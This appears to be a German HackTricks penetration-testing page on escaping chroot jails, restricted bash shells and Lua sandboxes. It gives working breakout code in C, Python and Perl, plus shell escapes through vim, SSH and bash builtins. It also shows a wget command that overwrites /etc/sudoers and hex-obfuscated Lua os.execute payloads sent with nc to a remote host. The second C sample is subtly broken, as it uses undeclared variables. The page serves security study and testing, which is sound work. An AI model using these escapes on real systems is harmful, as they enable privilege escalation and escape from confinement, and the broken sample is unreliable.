# Ausbrechen aus Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Suche in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **ob du eine Binärdatei mit der "Shell"-Eigenschaft ausführen kannst**

## Chroot-Ausbrüche

Von [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Der chroot-Mechanismus ist **nicht dazu gedacht**, um gegen absichtliche Manipulationen durch **privilegierte** (**root**) **Benutzer** zu verteidigen. In den meisten Systemen stapeln sich chroot-Kontexte nicht richtig und chrooted Programme **mit ausreichenden Rechten können einen zweiten chroot durchführen, um auszubrechen**.\
Normalerweise bedeutet dies, dass du root innerhalb des chroot sein musst, um auszubrechen.

> [!TIP]
> Das **Werkzeug** [**chw00t**](https://github.com/earthquake/chw00t) wurde entwickelt, um die folgenden Szenarien auszunutzen und aus `chroot` auszubrechen.

### Root + CWD

> [!WARNING]
> Wenn du **root** innerhalb eines chroot bist, **kannst du ausbrechen**, indem du **einen weiteren chroot** erstellst. Das liegt daran, dass 2 chroots nicht koexistieren können (in Linux), also wenn du einen Ordner erstellst und dann **einen neuen chroot** in diesem neuen Ordner erstellst, während du **außerhalb davon bist**, wirst du jetzt **außerhalb des neuen chroot** sein und somit im FS.
>
> Dies geschieht, weil chroot normalerweise DEIN Arbeitsverzeichnis nicht in das angegebene verschiebt, sodass du einen chroot erstellen kannst, aber außerhalb davon bist.

Normalerweise wirst du die `chroot`-Binärdatei nicht innerhalb eines chroot-Jails finden, aber du **könntest eine Binärdatei kompilieren, hochladen und ausführen**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Gespeicherter fd

> [!WARNING]
> Dies ist ähnlich wie im vorherigen Fall, aber in diesem Fall **speichert der Angreifer einen Dateideskriptor für das aktuelle Verzeichnis** und **erstellt das chroot in einem neuen Ordner**. Schließlich hat er **Zugriff** auf diesen **FD** **außerhalb** des chroot, er greift darauf zu und **entkommt**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD kann über Unix Domain Sockets übergeben werden, also:
>
> - Erstelle einen Kindprozess (fork)
> - Erstelle UDS, damit Eltern- und Kindprozess kommunizieren können
> - Führe chroot im Kindprozess in einem anderen Ordner aus
> - Erstelle im Elternprozess einen FD eines Ordners, der außerhalb des neuen chroot des Kindprozesses liegt
> - Übergebe diesen FD an den Kindprozess über die UDS
> - Der Kindprozess wechselt in das Verzeichnis dieses FD, und da es außerhalb seines chroot ist, wird er aus dem Gefängnis entkommen

### Root + Mount

> [!WARNING]
>
> - Montiere das Root-Gerät (/) in ein Verzeichnis innerhalb des chroot
> - Chroote in dieses Verzeichnis
>
> Dies ist in Linux möglich

### Root + /proc

> [!WARNING]
>
> - Montiere procfs in ein Verzeichnis innerhalb des chroot (falls es noch nicht geschehen ist)
> - Suche nach einer PID, die einen anderen root/cwd-Eintrag hat, wie: /proc/1/root
> - Chroote in diesen Eintrag

### Root(?) + Fork

> [!WARNING]
>
> - Erstelle einen Fork (Kindprozess) und chroote in einen anderen Ordner tiefer im FS und wechsle in ihn
> - Bewege vom Elternprozess den Ordner, in dem sich der Kindprozess befindet, in einen Ordner vor dem chroot der Kinder
> - Dieser Kinderprozess wird sich außerhalb des chroot finden

### ptrace

> [!WARNING]
>
> - Vor einiger Zeit konnten Benutzer ihre eigenen Prozesse von einem eigenen Prozess debuggen... aber das ist standardmäßig nicht mehr möglich
> - Wenn es jedoch möglich ist, könntest du ptrace in einen Prozess und einen Shellcode darin ausführen ([siehe dieses Beispiel](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Hole Informationen über das Gefängnis:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### PATH ändern

Überprüfen Sie, ob Sie die PATH-Umgebungsvariable ändern können.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Vim verwenden
```bash
:set shell=/bin/sh
:shell
```
### Skript erstellen

Überprüfen Sie, ob Sie eine ausführbare Datei mit _/bin/bash_ als Inhalt erstellen können.
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Bash über SSH erhalten

Wenn Sie über SSH zugreifen, können Sie diesen Trick verwenden, um eine Bash-Shell auszuführen:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Erklären
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Sie können beispielsweise die sudoers-Datei überschreiben.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Andere Tricks

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Es könnte auch interessant sein, die Seite zu besuchen:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Tricks zum Entkommen aus Python-Jails auf der folgenden Seite:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Auf dieser Seite finden Sie die globalen Funktionen, auf die Sie innerhalb von Lua zugreifen können: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval mit Befehlsausführung:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Einige Tricks, um **Funktionen einer Bibliothek aufzurufen, ohne Punkte zu verwenden**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Auflisten von Funktionen einer Bibliothek:
```bash
for k,v in pairs(string) do print(k,v) end
```
Beachten Sie, dass sich bei jeder Ausführung der vorherigen Einzeiler in einer **anderen Lua-Umgebung die Reihenfolge der Funktionen ändert**. Daher können Sie, wenn Sie eine bestimmte Funktion ausführen müssen, einen Brute-Force-Angriff durchführen, indem Sie verschiedene Lua-Umgebungen laden und die erste Funktion der Bibliothek aufrufen:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Interaktive Lua-Shell erhalten**: Wenn Sie sich in einer eingeschränkten Lua-Shell befinden, können Sie eine neue Lua-Shell (und hoffentlich unbegrenzt) erhalten, indem Sie Folgendes aufrufen:
```bash
debug.debug()
```
## Referenzen

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Folien: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))

{{#include ../../banners/hacktricks-training.md}}
